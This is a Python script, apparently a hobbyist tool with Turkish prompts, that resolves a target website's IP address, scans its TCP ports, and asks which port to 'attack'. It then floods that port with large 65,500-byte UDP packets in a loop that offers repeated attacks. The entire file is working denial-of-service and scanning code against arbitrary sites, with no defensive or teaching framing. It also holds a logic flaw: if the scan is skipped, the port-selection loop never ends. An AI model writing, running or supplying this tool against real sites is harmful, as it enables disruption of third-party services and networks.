import os
import socket

print("""
1- Hedef web sitesinin IP adresini al
2- Programı kapat
""")

while True:
    secim = input("Yapmak istediğiniz işlemi seçin: ")

    if secim == "1":
        hedef_sayfa = input("Hedef web sitesini girin (örn. www.google.com): ")
        hedef_ip = socket.gethostbyname(hedef_sayfa)
        print("Hedef IP adresi:", hedef_ip)

        scan_ports = input("Açık portları tarayalım mı? (e/h): ")
        if scan_ports.lower() == "e":
            open_ports = []
            try:
                for port in range(1, 65535):
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.1)
                    result = sock.connect_ex((hedef_ip, port))
                    if result == 0:
                        print(f"Port {port}: Açık")
                        open_ports.append(port)
                        if len(open_ports) == 2:  # Açık port sayısı 2'ye ulaştığında döngüyü sonlandır
                            break
                    sock.close()
                if not open_ports:
                    print("Açık port bulunamadı.")
                    exit()
                saldiri_portu = int(input("Hangi porta saldırmak istersiniz?"))
                if saldiri_portu not in open_ports:
                    print("Seçtiğiniz port kapalı!")
                    exit()
            except KeyboardInterrupt:
                print("\nProgram durduruldu...")
                exit()
        else:
            open_ports = []
            while True:
                saldiri_portu = int(input("Hangi porta saldırmak istersiniz? "))
                if saldiri_portu not in open_ports:
                    print("Seçtiğiniz port kapalı!")
                else:
                    break

        while True:
            ping_adet = input("Kaç adet ping atılsın? (varsayılan 1): ")
            if not ping_adet.isdigit():
                print("Geçersiz değer! Lütfen bir sayı girin.")
            else:
                break

        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                bytes = b"a" * 65500  # Burada bytes tipinde bir veri atanıyor.
                sayac = 0
                while True:
                    sock.sendto(bytes, (hedef_ip, saldiri_portu))
                    sayac += 1
                    print("Saldırı devam ediyor, gönderilen paket sayısı:", sayac)
                    if sayac == int(ping_adet):  # Eklenen kontrol
                        break
            except KeyboardInterrupt:
                print("\nSaldırı durduruldu")

            devam = input("Saldırı tamamlandı. Yeni bir saldırı yapmak istiyor musunuz? (e/h): ")
            if devam.lower() == "h":
                break
            if devam.lower() == "e":
                continue
    elif secim == "2":
        print("Program kapatılıyor...")
        break
    else:
        print("Geçersiz seçenek! Lütfen tekrar deneyin.")